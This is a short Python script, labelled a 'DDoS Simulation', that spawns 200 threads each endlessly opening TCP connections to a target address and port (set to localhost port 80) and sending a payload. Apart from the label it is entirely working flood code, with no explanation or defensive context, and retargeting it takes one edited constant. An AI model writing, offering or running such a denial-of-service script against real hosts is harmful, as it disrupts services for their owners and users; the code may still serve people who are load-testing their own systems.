
import socket
import threading

TARGET_IP = "127.0.0.1"
TARGET_PORT = 80

def flood():

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(b"Flood")
            s.close()

        except:
            pass

print("Starting DDoS Simulation...")

for _ in range(200):

    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

input("Press Enter to stop...")
